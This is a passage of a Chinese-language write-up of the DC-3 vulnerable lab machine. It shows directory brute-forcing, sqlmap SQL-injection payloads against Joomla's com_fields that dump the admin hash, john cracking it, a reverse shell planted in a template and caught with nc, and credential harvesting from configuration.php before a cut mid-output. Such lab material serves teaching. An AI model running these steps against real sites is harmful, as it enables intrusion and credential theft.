class="hljs-built_in">log</span><br><br>Target: http://192.168.56.125/<br><br>[10:50:31] Starting: <br>[10:50:32] 403 -  300B  - /.ht_wsr.txt                                     <br>[10:50:32] 403 -  303B  - /.htaccess.bak1<br>[10:50:32] 403 -  305B  - /.htaccess.sample<br>[10:50:32] 403 -  303B  - /.htaccess.orig<br>[10:50:32] 403 -  301B  - /.htaccess_sc<br>[10:50:32] 403 -  303B  - /.htaccess.save<br>[10:50:32] 403 -  301B  - /.htaccessBAK<br>[10:50:32] 403 -  303B  - /.htaccess_orig<br>[10:50:32] 403 -  304B  - /.htaccess_extra<br>[10:50:32] 403 -  302B  - /.htaccessOLD2<br>[10:50:32] 403 -  301B  - /.htaccessOLD                                    <br>[10:50:32] 403 -  293B  - /.htm<br>[10:50:32] 403 -  294B  - /.html<br>[10:50:32] 403 -  300B  - /.httr-oauth<br>[10:50:32] 403 -  299B  - /.htpasswds<br>[10:50:32] 403 -  303B  - /.htpasswd_test                                  <br>[10:50:33] 403 -  293B  - /.php                                            <br>[10:50:33] 403 -  294B  - /.php3                                           <br>[10:50:36] 200 -   18KB - /LICENSE.txt<br>[10:50:36] 200 -    4KB - /README.txt<br>[10:50:42] 301 -  324B  - /administrator  -&gt;  http://192.168.56.125/administrator/<br>[10:50:42] 403 -  312B  - /administrator/.htaccess<br>[10:50:42] 200 -    5KB - /administrator/<br>[10:50:42] 200 -   31B  - /administrator/cache/<br>[10:50:42] 200 -    2KB - /administrator/includes/<br>[10:50:42] 200 -    5KB - /administrator/index.php<br>[10:50:42] 200 -   31B  - /administrator/logs/<br>[10:50:42] 301 -  329B  - /administrator/logs  -&gt;  http://192.168.56.125/administrator/logs/<br>[10:50:45] 301 -  314B  - /bin  -&gt;  http://192.168.56.125/bin/<br>[10:50:45] 200 -   31B  - /bin/<br>[10:50:45] 301 -  316B  - /cache  -&gt;  http://192.168.56.125/cache/<br>[10:50:45] 200 -   31B  - /cache/<br>[10:50:46] 200 -   31B  - /cli/<br>[10:50:46] 301 -  321B  - /components  -&gt;  http://192.168.56.125/components/<br>[10:50:46] 200 -   31B  - /components/<br>[10:50:47] 200 -    0B  - /configuration.php<br>[10:50:52] 200 -    3KB - /htaccess.txt<br>[10:50:52] 301 -  317B  - /images  -&gt;  http://192.168.56.125/images/<br>[10:50:52] 200 -   31B  - /images/<br>[10:50:52] 301 -  319B  - /includes  -&gt;  http://192.168.56.125/includes/<br>[10:50:52] 200 -   31B  - /includes/<br>[10:50:53] 200 -    7KB - /index.php<br>[10:50:54] 301 -  319B  - /language  -&gt;  http://192.168.56.125/language/<br>[10:50:54] 200 -   31B  - /layouts/<br>[10:50:54] 301 -  320B  - /libraries  -&gt;  http://192.168.56.125/libraries/<br>[10:50:54] 200 -   31B  - /libraries/<br>[10:50:55] 301 -  316B  - /media  -&gt;  http://192.168.56.125/media/<br>[10:50:56] 200 -   31B  - /media/<br>[10:50:56] 301 -  318B  - /modules  -&gt;  http://192.168.56.125/modules/<br>[10:50:56] 200 -   31B  - /modules/<br>[10:51:00] 301 -  318B  - /plugins  -&gt;  http://192.168.56.125/plugins/<br>[10:51:00] 200 -   31B  - /plugins/<br>[10:51:02] 200 -  836B  - /robots.txt.dist<br>[10:51:02] 403 -  303B  - /server-status/<br>[10:51:02] 403 -  302B  - /server-status<br>[10:51:05] 200 -   31B  - /templates/<br>[10:51:05] 200 -    0B  - /templates/protostar/<br>[10:51:05] 200 -    0B  - /templates/beez3/<br>[10:51:05] 200 -   31B  - /templates/index.html<br>[10:51:05] 301 -  320B  - /templates  -&gt;  http://192.168.56.125/templates/<br>[10:51:05] 200 -    0B  - /templates/system/<br>[10:51:06] 301 -  314B  - /tmp  -&gt;  http://192.168.56.125/tmp/<br>[10:51:06] 200 -   31B  - /tmp/<br>[10:51:08] 200 -    2KB - /web.config.txt<br></code></pre></td></tr></table></figure><h2 id="Joomla-Sql-Injection"><a href="#Joomla-Sql-Injection" class="headerlink" title="Joomla Sql Injection"></a>Joomla Sql Injection</h2><p>在 db-exploit 中搜到了响应的漏洞利用脚本，其中给出了如何使用 SQLMap 进行注入</p><p><img src="/pic/9e341effab3058db896fd9ea4bbf42b9_MD5.png"></p><p>尝试按照上面的命令来操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://192.168.56.125/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br>┌──(kali㉿kali)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://192.168.56.125/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -p list[fullordering] --tables<br><br>┌──(kali㉿kali)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://192.168.56.125/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -p list[fullordering] -T <span class="hljs-string">&#x27;#__users&#x27;</span> --columns<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://192.168.56.125/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -p list[fullordering] -T <span class="hljs-string">&#x27;#__users&#x27;</span> --dump     <br>        ___<br>       __H__                                                                                                        <br> ___ ___[<span class="hljs-string">&quot;]_____ ___ ___  &#123;1.7.6#stable&#125;                                                                            </span><br><span class="hljs-string">|_ -| . [&quot;</span>]     | .<span class="hljs-string">&#x27;| . |                                                                                           </span><br><span class="hljs-string">|___|_  [&quot;]_|_|_|__,|  _|                                                                                           </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                                                        </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 11:10:50 /2023-07-10/<br><br>[11:10:50] [INFO] fetched random HTTP User-Agent header value <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/419 (KHTML, like Gecko) Safari/419.3&#x27;</span> from file <span class="hljs-string">&#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span>                 <br>[11:10:50] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span> <br>[11:10:50] [INFO] testing connection to the target URL<br>[11:10:51] [WARNING] the web server responded with an HTTP error code (500) <span class="hljs-built_in">which</span> could interfere with the results of the tests<br>you have not declared cookie(s), <span class="hljs-keyword">while</span> server wants to <span class="hljs-built_in">set</span> its own (<span class="hljs-string">&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=k6o2ipqeqht...g5bmibevh0&#x27;</span>). Do you want to use those [Y/n] y<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: list[fullordering] (GET)<br>    Type: error-based<br>    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(7808,CONCAT(0x2e,0x7162786b71,(SELECT (ELT(7808=7808,1))),0x716b766b71),3038))<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 3897 FROM (SELECT(SLEEP(5)))wOhr)<br>---<br>[11:10:52] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)<br>web application technology: Apache 2.4.18<br>back-end DBMS: MySQL &gt;= 5.1<br>[11:10:52] [INFO] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;#__users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;joomladb&#x27;</span><br>[11:10:52] [WARNING] unable to retrieve column names <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;#__users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;joomladb&#x27;</span><br><span class="hljs-keyword">do</span> you want to use common column existence check? [y/N/q] y<br>[11:10:53] [WARNING] <span class="hljs-keyword">in</span> <span class="hljs-keyword">case</span> of continuous data retrieval problems you are advised to try a switch <span class="hljs-string">&#x27;--no-cast&#x27;</span> or switch <span class="hljs-string">&#x27;--hex&#x27;</span><br><span class="hljs-built_in">which</span> common columns (wordlist) file <span class="hljs-keyword">do</span> you want to use?<br>[1] default <span class="hljs-string">&#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;</span> (press Enter)<br>[2] custom<br>&gt; <br>[11:10:54] [INFO] checking column existence using items from <span class="hljs-string">&#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;</span><br>[11:10:54] [INFO] adding words used on web page to the check list<br>please enter number of threads? [Enter <span class="hljs-keyword">for</span> 1 (current)] <br>[11:10:56] [WARNING] running <span class="hljs-keyword">in</span> a single-thread mode. This could take a <span class="hljs-keyword">while</span><br>[11:10:56] [INFO] retrieved: <span class="hljs-built_in">id</span>                                                                                    <br>[11:10:56] [INFO] retrieved: name                                                                                  <br>[11:10:56] [INFO] retrieved: username                                                                              <br>[11:10:57] [INFO] retrieved: email                                                                                 <br>[11:11:00] [INFO] retrieved: password                                                                              <br>[11:11:44] [INFO] retrieved: params                                                                                <br>                                                                                                                   <br>[11:11:56] [INFO] fetching entries <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;#__users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;joomladb&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;admin&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;freddy@norealaddress.net&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;629&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;&#123;&quot;admin_style&quot;:&quot;&quot;,&quot;admin_language&quot;:&quot;&quot;,&quot;language&quot;:&quot;&quot;,&quot;editor&quot;:&quot;&quot;,&quot;helpsite&quot;:&quot;&quot;,&quot;time...</span><br><span class="hljs-string">[11:11:56] [INFO] retrieved: &#x27;</span>admin<span class="hljs-string">&#x27;</span><br><span class="hljs-string">Database: joomladb</span><br><span class="hljs-string">Table: #__users</span><br><span class="hljs-string">[1 entry]</span><br><span class="hljs-string">+-----+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="hljs-string">| id  | email                    | name   | params                                                                                       | username | password                                                     |</span><br><span class="hljs-string">+-----+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="hljs-string">| 629 | freddy@norealaddress.net | admin  | &#123;&quot;admin_style&quot;:&quot;&quot;,&quot;admin_language&quot;:&quot;&quot;,&quot;language&quot;:&quot;&quot;,&quot;editor&quot;:&quot;&quot;,&quot;helpsite&quot;:&quot;&quot;,&quot;timezone&quot;:&quot;&quot;&#125; | admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |</span><br><span class="hljs-string">+-----+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[11:11:56] [INFO] table &#x27;</span>joomladb.`<span class="hljs-comment">#__users`&#x27; dumped to CSV file &#x27;/home/kali/.local/share/sqlmap/output/192.168.56.125/dump/joomladb/#__users.csv&#x27;                                                                                      </span><br>[11:11:56] [WARNING] HTTP error codes detected during run:<br>500 (Internal Server Error) - 2683 <span class="hljs-built_in">times</span><br>[11:11:56] [INFO] fetched data logged to text files under <span class="hljs-string">&#x27;/home/kali/.local/share/sqlmap/output/192.168.56.125&#x27;</span><br><br>[*] ending @ 11:11:56 /2023-07-10/<br></code></pre></td></tr></table></figure><h2 id="john爆破"><a href="#john爆破" class="headerlink" title="john爆破"></a>john爆破</h2><p>拿到了用户密码的哈希值，在线工具没有搜索到，那就使用 john 来破解，同时还发现自己使用 john 命令老师忘记 <code>--wordlist=</code> 最后的 <code>=</code>，<code>hash-identifier</code> 没有识别出识别哈希类型，使用在线工具确定了哈希类型为 bcrypt，但是 <code>--format</code> 中没有这个哈希类型。通过网络搜索发现的确是可以使用 <code>--format=bcrypt</code> 的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_3]<br>└─$ <span class="hljs-built_in">cat</span> passwd <br>$2y$10<span class="hljs-variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br><br>┌──(kali㉿kali)-[~/Downloads/dc_3]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwd --format=bcrypt<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (bcrypt [Blowfish 32/64 X3])<br>Cost 1 (iteration count) is 1024 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>snoopy           (?)     <br>1g 0:00:00:00 DONE (2023-07-10 11:33) 1.086g/s 156.5p/s 156.5c/s 156.5C/s mylove..sandra<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><h2 id="Joomla-后台反弹-shell"><a href="#Joomla-后台反弹-shell" class="headerlink" title="Joomla 后台反弹 shell"></a>Joomla 后台反弹 shell</h2><p>使用这个密码登录后台，然后修改模板文件进而将反弹 shell 的代码写入其中</p><p><img src="/pic/7bcf2562d3dc9c92980cf07ea78dbdc7_MD5.png"></p><p><img src="/pic/e219b70abb4bdc9984453c4a5b08d04d_MD5.png"></p><p><img src="/pic/fea345c955a85e5d477b1e5bbe477504_MD5.png"></p><p>注意访问这个文件的路径为 <code>http://192.168.56.125/templates/beez3/8888.php</code>，可以根据目录爆破的结果辅助判断文件路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443    <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.125] 53722<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1173): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@DC-3:/var/www/html/templates/beez3$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@DC-3:/var/www/html/templates/beez3$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@DC-3:/var/www/html/templates/beez3$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:cc:d5:<span class="hljs-built_in">df</span> brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.125/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fecc:d5df/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>www-data@DC-3:/var/www/html/templates/beez3$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux DC-3 4.4.0-21-generic <span class="hljs-comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux</span><br>www-data@DC-3:/var/www/html/templates/beez3$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>&lt;/templates/beez3$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>反弹 shell 成功，开始收集文件信息，尤其是配置文件中的数据库密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/var/www/html$ <span class="hljs-built_in">cat</span> configuration.php<br><span class="hljs-built_in">cat</span> configuration.php<br>&lt;?php<br>class JConfig &#123;<br>        public <span class="hljs-variable">$offline</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$offline_message</span> = <span class="hljs-string">&#x27;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#x27;</span>;<br>        public <span class="hljs-variable">$display_offline_message</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$offline_image</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$sitename</span> = <span class="hljs-string">&#x27;DC-3&#x27;</span>;<br>        public <span class="hljs-variable">$editor</span> = <span class="hljs-string">&#x27;tinymce&#x27;</span>;<br>        public <span class="hljs-variable">$captcha</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$list_limit</span> = <span class="hljs-string">&#x27;20&#x27;</span>;<br>        public <span class="hljs-variable">$access</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$debug</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$debug_lang</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$dbtype</span> = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br>        public <span class="hljs-variable">$host</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        public <span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br>        public <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;squires&#x27;</span>;<br>        public <span class="hljs-variable">$db</span> = <span class="hljs-string">&#x27;joomladb&#x27;</span>;<br>        public <span class="hljs-variable">$dbprefix</span> = <span class="hljs-string">&#x27;d8uea_&#x27;</span>;<br>        public <span class="hljs-variable">$live_site</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$secret</span> = <span class="hljs-string">&#x27;7M6S1HqGMvt1JYkY&#x27;</span>;<br>        public <span class="hljs-variable">$gzip</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$error_reporting</span> = <span class="hljs-string">&#x27;default&#x27;</span>;<br>        public <span class="hljs-variable">$helpurl</span> = <span class="hljs-string">&#x27;https://help.joomla.org/proxy/index.php?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_host</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_port</span> = <span class="hljs-string">&#x27;21&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_user</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_pass</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_root</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_enable</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$offset</span> = <span class="hljs-string">&#x27;UTC&#x27;</span>;<br>        public <span class="hljs-variable">$mailonline</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$mailer</span> = <span class="hljs-string">&#x27;mail&#x27;</span>;<br>        public <span class="hljs-variable">$mailfrom</span> = <span class="hljs-string">&#x27;freddy@norealaddress.net&#x27;</span>;<br>        public <span class="hljs-variable">$fromname</span> = <span class="hljs-string">&#x27;DC-3&#x27;</span>;<br>        public <span class="hljs-variable">$sendmail</span> = <span class="hljs-string">&#x27;/usr/sbin/sendmail&#x27;</span>;<br>        public <span class="hljs-variable">$smtpauth</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$smtpuser</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$smtppass</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$smtphost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        public <span class="hljs-variable">$smtpsecure</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>        public <span class="hljs-variable">$smtpport</span> = <span class="hljs-string">&#x27;25&#x27;</span>;<br>        public <span class="hljs-variable">$caching</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$cache_handler</span> = <span class="hljs-string">&#x27;file&#x27;</span>;<br>        public <span class="hljs-variable">$cachetime</span> = <span class="hljs-string">&#x27;15&#x27;</span>;<br>        public <span class="hljs-variable">$cache_platformprefix</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$MetaDesc</span> = <span class="hljs-string">&#x27;A website for DC-3&#x27;</span>;<br>        public <span class="hljs-variable">$MetaKeys</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$MetaTitle</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$MetaAuthor</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$MetaVersion</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$robots</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$sef</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$sef_rewrite</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$sef_suffix</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$unicodeslugs</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$feed_limit</span> = <span class="hljs-string">&#x27;10&#x27;</span>;<br>        public <span class="hljs-variable">$feed_email</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>        public <span class="hljs-variable">$log_path</span> = <span class="hljs-string">&#x27;/var/www/html/administrator/logs&#x27;</span>;<br>        public <span class="hljs-variable">$tmp_path</span> = <span class="hljs-string">&#x27;/var/www/html/tmp&#x27;</span>;<br>        public <span class="hljs-variable">$lifetime</span> = <span class="hljs-string">&#x27;15&#x27;</span>;<br>        public <span class="hljs-variable">$session_handler</span> = <span class="hljs-string">&#x27;database&#x27;</span>;<br>        public <span class="hljs-variable">$shared_session</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h3><p>拿到了数据库的密码 <code>squires</code>，到这里我们收集到了两个密码一个是 Joomla 后台密码一个是数据库密码，可以进行简单的密码碰撞，但是经过我的尝试都失败了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/tmp$ su -<br>su -<br>Password: 7M6S1HqGMvt1JYkY<br><br>su: Authentication failure<br>www-data@DC-3:/tmp$ su -<br>su -<br>Password: squires<br><br>su: Authentication 